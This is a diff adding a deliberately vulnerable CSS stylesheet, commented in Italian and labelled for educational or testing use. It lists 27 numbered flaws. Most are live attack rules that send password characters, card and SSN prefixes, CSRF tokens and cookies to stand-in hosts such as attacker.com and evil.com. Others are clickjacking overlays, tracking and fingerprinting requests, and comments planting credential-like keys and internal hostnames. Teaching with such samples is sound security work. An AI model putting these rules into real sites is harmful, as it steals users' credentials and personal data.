@@ -1,0 +1,318 @@
+/**
+ * 🔴 VULNERABLE STYLES.CSS
+ * File CSS con vulnerabilità e information disclosure
+ * ATTENZIONE: NON USARE IN PRODUZIONE!
+ */
+
+/* 🔴 VULNERABILITÀ #1: Commenti con informazioni sensibili */
+/*
+ * ==========================================
+ * PRODUCTION CONFIGURATION
+ * ==========================================
+ * Database: mysql://admin:SuperSecret123@db.prod.internal:3306/banking
+ * Redis Cache: redis://:CachePass2024@cache.internal:6379
+ * API Endpoint: https://api.internal.bank/v1
+ * Admin Panel: https://admin.secretdomain.internal/dashboard
+ * 
+ * API Keys:
+ * - AWS: AKIAIOSFODNN7EXAMPLE
+ * - Stripe: sk_live_51HxYzKJxYzKJxYzKJ
+ * - SendGrid: SG.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+ * 
+ * TODO: Remove these credentials before deployment!
+ * Last updated: 2025-01-15 by john.doe@company.com
+ */
+
+/* 🔴 VULNERABILITÀ #2: Internal paths disclosure */
+/*
+ * Asset paths:
+ * - Images: /var/www/html/production/assets/images/
+ * - Uploads: /var/www/html/production/uploads/sensitive/
+ * - Logs: /var/log/apache2/access.log
+ * - Backups: /backups/database/prod_backup_2025.sql
+ */
+
+/* 🔴 VULNERABILITÀ #3: CSS Injection vulnerability */
+/* Questo selettore può essere sfruttato per CSS injection se user input non sanitizzato */
+[data-user-input*=""] {
+    /* Potenziale CSS injection se attributo popolato con input utente */
+    background: var(--user-controlled-value);
+}
+
+/* 🔴 VULNERABILITÀ #4: Keylogger via CSS (attribute selector attack) */
+/* Può essere usato per estrarre caratteri di password */
+input[type="password"][value^="a"] { background: url("http://attacker.com/log?char=a"); }
+input[type="password"][value^="b"] { background: url("http://attacker.com/log?char=b"); }
+input[type="password"][value^="c"] { background: url("http://attacker.com/log?char=c"); }
+/* ... continua per tutti i caratteri ... */
+
+/* 🔴 VULNERABILITÀ #5: Data exfiltration via CSS */
+input[name="creditcard"][value^="4"] { 
+    background: url("http://exfiltrate.evil.com/cc?starts=4"); 
+}
+input[name="creditcard"][value^="5"] { 
+    background: url("http://exfiltrate.evil.com/cc?starts=5"); 
+}
+
+input[name="ssn"][value^="0"] { 
+    background: url("http://exfiltrate.evil.com/ssn?starts=0"); 
+}
+input[name="ssn"][value^="1"] { 
+    background: url("http://exfiltrate.evil.com/ssn?starts=1"); 
+}
+
+/* 🔴 VULNERABILITÀ #6: CSS-based timing attack */
+#csrf-token[value^="a"] { animation: exfiltrate 1s; }
+#csrf-token[value^="b"] { animation: exfiltrate 2s; }
+@keyframes exfiltrate {
+    to { background: url("http://timing.attacker.com/"); }
+}
+
+/* 🔴 VULNERABILITÀ #7: Clickjacking helper styles */
+.hidden-overlay {
+    /* Può essere usato per overlay invisibili in clickjacking attacks */
+    opacity: 0;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+}
+
+/* 🔴 VULNERABILITÀ #8: Mixed content - HTTP resources */
+@import url('http://insecure-fonts.com/font.css');
+
+@font-face {
+    font-family: 'VulnerableFont';
+    /* 🔴 Font da HTTP su pagina HTTPS */
+    src: url('http://untrusted-cdn.com/fonts/vulnerable.woff2');
+}
+
+body {
+    /* 🔴 Background image da HTTP */
+    background-image: url('http://insecure-images.com/background.jpg');
+}
+
+/* 🔴 VULNERABILITÀ #9: CSS Injection point per Unicode tricks */
+.user-content::before {
+    /* Se content viene da user input, può contenere Unicode tricks */
+    content: attr(data-user-content);
+    /* Potenziale per homograph attacks o rendering tricks */
+}
+
+/* 🔴 VULNERABILITÀ #10: Sensitive class names che rivelano logica business */
+.is-admin { border: 2px solid gold; }
+.is-premium-user { background: linear-gradient(to right, gold, orange); }
+.has-payment-issues { border: 2px solid red; }
+.account-overdrawn { background-color: #ffebee; }
+.credit-score-low { color: red; }
+.credit-score-high { color: green; }
+.flagged-for-fraud { outline: 3px dashed red; }
+.pending-verification { opacity: 0.5; }
+.internal-employee { background: #e3f2fd; }
+
+/* 🔴 VULNERABILITÀ #11: Debug styles lasciati in produzione */
+.debug-mode-enabled {
+    border: 5px dashed red !important;
+}
+
+.show-all-data::after {
+    /* Mostra data attributes sensibili */
+    content: attr(data-password) " | " attr(data-api-key) " | " attr(data-session-token);
+    display: block;
+    background: yellow;
+    color: red;
+    padding: 10px;
+}
+
+/* 🔴 VULNERABILITÀ #12: CSS che espone internal structure */
+/* Questi selettori rivelano la struttura interna dell'applicazione */
+.api-v2-endpoint { /* Rivela versione API */ }
+.legacy-auth-system { /* Rivela sistema auth legacy */ }
+.temporary-bypass { /* Rivela esistenza di bypass temporanei */ }
+.admin-override-enabled { /* Rivela feature pericolose */ }
+
+/* 🔴 VULNERABILITÀ #13: Sourcemap disclosure */
+/*# sourceMappingURL=styles.css.map */
+/* Il sourcemap può contenere path interni, variabili, commenti originali */
+
+/* 🔴 VULNERABILITÀ #14: @import da fonte non verificata */
+@import url('http://malicious-styles.com/inject.css');
+
+/* 🔴 VULNERABILITÀ #15: CSS variables con valori sensibili */
+:root {
+    /* 🔴 Variabili CSS con info sensibili accessibili via getComputedStyle */
+    --api-endpoint: "https://api.internal.company.com/v1";
+    --admin-email: "admin@company.com";
+    --support-phone: "+1-555-123-4567";
+    --internal-domain: "internal.company.local";
+    --database-host: "db.prod.internal";
+    --backup-server: "backup.internal.company.com";
+}
+
+/* 🔴 VULNERABILITÀ #16: Expression() for IE (code execution in old IE) */
+.old-ie-vulnerable {
+    /* In IE vecchi, expression() esegue JavaScript */
+    width: expression(alert('XSS via CSS'));
+    background: expression(document.location='http://attacker.com/steal?cookie='+document.cookie);
+}
+
+/* 🔴 VULNERABILITÀ #17: Behavior binding (IE specific) */
+.ie-behavior-vuln {
+    /* IE specific - può caricare ed eseguire file .htc */
+    behavior: url('http://attacker.com/malicious.htc');
+}
+
+/* 🔴 VULNERABILITÀ #18: CSS filters che possono essere abusati */
+.svg-filter-injection {
+    /* SVG filters possono contenere JavaScript in alcuni browser */
+    filter: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>#filter');
+}
+
+/* 🔴 VULNERABILITÀ #19: User tracking via background-image */
+.track-user-visit {
+    /* Ogni volta che elemento è visibile, fa richiesta HTTP */
+    background-image: url('http://tracker.evil.com/pixel?user=USERID&page=PAGE&time=TIMESTAMP');
+}
+
+.track-scroll {
+    /* Traccia se utente ha scrollato fino a questo punto */
+    background: url('http://tracker.evil.com/scroll-depth?depth=50percent');
+}
+
+/* 🔴 VULNERABILITÀ #20: CSS timing attacks */
+.timing-attack-vector {
+    /* Può essere usato per timing attacks su CSS */
+    animation: leak 9999s;
+    animation-delay: calc(1s * var(--secret-value));
+}
+
+/* 🔴 VULNERABILITÀ #21: Malicious @font-face */
+@font-face {
+    font-family: 'TrackingFont';
+    /* Font che fa richiesta HTTP per ogni carattere renderizzato */
+    src: 
+        url('http://font-tracker.com/track?char=a') format('woff2'),
+        url('http://font-tracker.com/track?char=b') format('woff2'),
+        url('http://font-tracker.com/track?char=c') format('woff2');
+}
+
+/* 🔴 VULNERABILITÀ #22: Viewport-based information disclosure */
+@media (max-width: 1024px) {
+    /* Rivela dimensione viewport - può essere usato per fingerprinting */
+    body::after {
+        content: "Desktop detected";
+        display: none; /* Ma fa comunque richiesta background */
+        background: url('http://fingerprint.com/screen?size=desktop');
+    }
+}
+
+@media (max-width: 768px) {
+    body::after {
+        content: "Tablet detected";
+        background: url('http://fingerprint.com/screen?size=tablet');
+    }
+}
+
+@media (max-width: 480px) {
+    body::after {
+        content: "Mobile detected";
+        background: url('http://fingerprint.com/screen?size=mobile');
+    }
+}
+
+/* 🔴 VULNERABILITÀ #23: CSS con backdoor per phishing */
+.login-form input[type="password"] {
+    /* Replica input in elemento nascosto che viene inviato ad attacker */
+    background: url('http://phishing.attacker.com/capture');
+}
+
+/* 🔴 VULNERABILITÀ #24: Malicious CSS counters */
+body {
+    /* CSS counters che possono essere letti via JavaScript per info leakage */
+    counter-reset: secret-counter var(--csrf-token);
+}
+
+/* 🔴 VULNERABILITÀ #25: CSS-based CAPTCHA bypass hints */
+.captcha-answer {
+    /* Classi che rivelano risposta CAPTCHA */
+    /* In combinazione con CSS selectors, può rivelare caratteri */
+}
+
+.captcha-char-a { /* Carattere A presente nel CAPTCHA */ }
+.captcha-char-b { /* Carattere B presente nel CAPTCHA */ }
+/* etc... */
+
+/* ==========================================
+ * METADATA SENSIBILI
+ * ==========================================
+ * 
+ * Build info:
+ * - Version: 2.3.4-production
+ * - Build date: 2025-01-15 14:32:05
+ * - Git commit: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0
+ * - Builder: jenkins@build-server.internal
+ * - Environment: production
+ * 
+ * Developer contacts:
+ * - Frontend Lead: john.doe@company.com
+ * - Backend Lead: jane.smith@company.com  
+ * - DevOps: ops-team@company.com
+ * 
+ * Emergency contacts:
+ * - On-call: +1-555-ONCALL-1
+ * - Security team: security@company.com
+ * 
+ * Internal tools:
+ * - CI/CD: https://jenkins.internal.company.com
+ * - Monitoring: https://grafana.internal.company.com
+ * - Logs: https://kibana.internal.company.com
+ * 
+ * ==========================================
+ */
+
+/* Styles normali (meno interessanti per attaccanti) */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 20px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+}
+
+.container {
+    max-width: 800px;
+    margin: 0 auto;
+    background: white;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+}
+
+/* ... altri stili normali ... */
+
+/* 🔴 VULNERABILITÀ #26: Unicode tricks in content */
+.unicode-trick::before {
+    /* Omografi Unicode che possono ingannare utenti */
+    content: "paypal.com";  /* Ma potrebbe essere рaypal.com con 'р' cirillico */
+}
+
+/* 🔴 VULNERABILITÀ #27: Z-index wars per clickjacking */
+.overlay-trap {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 999999;
+    opacity: 0.01;  /* Quasi invisibile ma cliccabile */
+}
+
+/*
+ * ==========================================
+ * END OF FILE
+ * 
+ * 🔴 WARNING: This file contains 27+ vulnerabilities
+ * For educational/testing purposes only!
+ * ==========================================
+ */
